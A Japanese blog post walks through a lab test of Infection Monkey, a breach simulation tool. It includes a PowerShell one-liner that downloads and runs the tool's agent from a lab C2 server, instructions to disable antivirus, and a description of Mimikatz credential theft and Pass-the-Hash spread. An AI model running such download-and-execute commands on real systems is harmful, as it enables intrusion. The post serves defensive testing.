---
title: "クラウド環境で使えるペネトレーションテストツール"
date: 2019-05-19T10:32:44+09:00
# trueにすると公開されない
draft: false
categories:
- security
- pentest
- cloud
tags:
- security
- pentest
- docker
# Googleはmeta keywordsを見ていないので意味がない
#keywords:
#- test
autoThumbnailImage: false
thumbnailImagePosition: "left"
thumbnailImage: /img/pentest.jpg
metaAlignment: center
---

プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
Infection Monkeyを動かしてみました。
<!--more-->

## あらかじめ準備しておく環境
* 被害者用のWindows7以上の VM
    * VMWareESxi6.5の上に構築
    * Windows Defenderとファイアーウォールを無効化
* 感染が拡大しても問題がないネットワーク
    * ルータでセグメントを分離
    * ルータ自体のパスワードを強固に設定
* DockerがインストールされたLinuxマシン
    * Ubuntu 18.04に構築
    * docker version 18.09.6
    * docker-compose version 1.17.1

## infection monkeyのセットアップ
```bash
$ git clone https://github.com/guardicore/monkey
$ monkey/docker
$ docker-compose build
$ docker-compose up -d
```

Dockerを動かしているマシンのブラウザからこちらのURLにアクセスすると下記のような画面が出力されます。
[https://localhost:5000/](https://localhost:5000/)

![](https://i.imgur.com/HH720sZ.png)

## 動作検証

検証を始める前に、VMのスナップショットを取得します。
スナップショットを取得することで、VMが感染してもすぐに元の状態に戻すことができます。

Infection Moncky管理画面の左側にある`2. Run Monkey`をクリックしたあと`Run on machine of your choice`をクリックすると
powershellコマンドのワンライナーが表示されます

![](https://i.imgur.com/dZ3Yb16.png)

malware.batという名前で上記で表示された文字列を貼り付けます。
私の環境では接続先が`172.22.0.3`となっていましたが、dockerを実行しているマシンのIPアドレスが`192.168.11.251`であったので、バッチファイルを少し変更しました。

```
powershell [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object System.Net.WebClient).DownloadFile('https://192.168.11.251:5000/api/monkey/download/monkey-windows-32.exe','.\monkey.exe'); ;Start-Process -FilePath '.\monkey.exe' -ArgumentList 'm0nk3y -s 192.168.11.251:5000';
```

バッチファイルは`管理者権限`で実行します。
![](https://i.imgur.com/gRU7RoS.png)

実行するとコマンドプロンプトが起動し、メッセージがたくさん表示されます。
この時点でウイルスを検知される場合はアンチウイルスを無効化し再度実行します。

`
環境によってはアンチウイルスをアンインストールする必要があります。
`

![](https://i.imgur.com/QQMKovj.png)

Infection Monkeyの管理画面のInfectionMapを見ると、感染したWindowsマシンが描画されます。
MonkeyIslandはC2サーバです。MonkeyIslandから灰色の線で結ばれているマシンはC2サーバから遠隔操作されています。

![](https://i.imgur.com/EpqFdmX.png)

しばらく待っているとWindowsサーバにも感染を広げてきました。
Mimikatzを使って認証情報を奪われ、Pass the Hash攻撃をされたようです。 
![](https://i.imgur.com/Q8pxKFX.png)

さらに放置するとスキャンを繰り返し侵入を拡大しようとしていきます。
![](https://i.imgur.com/HpNOMZ1.png)

その後30分ぐらい放置すると、WindowsだけでなくLinuxにまで侵入されました。
侵入されたマシンにはsshがインストールされており、ユーザ名が`user` パスワードが`password`となっていました。
![](https://i.imgur.com/HNLX2fD.png)

侵入されたホストのプロセスを確認するとmonkeyというプロセスが動いていることが確認できます。

#### Windowsの場合
![](https://i.imgur.com/RtMEubB.png)

#### Linuxの場合
![](https://i.imgur.com/qtRHQbN.png)

## レポート出力
4 Security Reportをクリックすると
シュミレーションの結果を評価したレポートが出力されます
![](https://i.imgur.com/cXDNudh.png)

ネットワーク図の表示は見辛いですね。。。
![](https://i.imgur.com/ntpTJb2.png)


## 最後に
MetasploitやNessusのような脆弱性スキャナーに比べると、ラテラルムーブメントのような
内部偵察、資格奪取、感染拡大まで自動化できるのが本ツールの特徴でした。
Exploitモジュールは他の脆弱性スキャナに比べると[明らかに少ない](https://github.com/guardicore/monkey/tree/develop/monkey/infection_monkey/exploit)ですが、Pythonで書かれているため個人的には拡張性が高いと思っています。

余談ですが、[前回の記事](/2019/05/wazuh/)で構築したWazuhのログを見ても、Infection Monckyで攻撃されている間のログはほとんど取れていませんでした。
EDRのような使い方はまだ期待できないようですね。
![](https://i.imgur.com/yraL2wG.png)

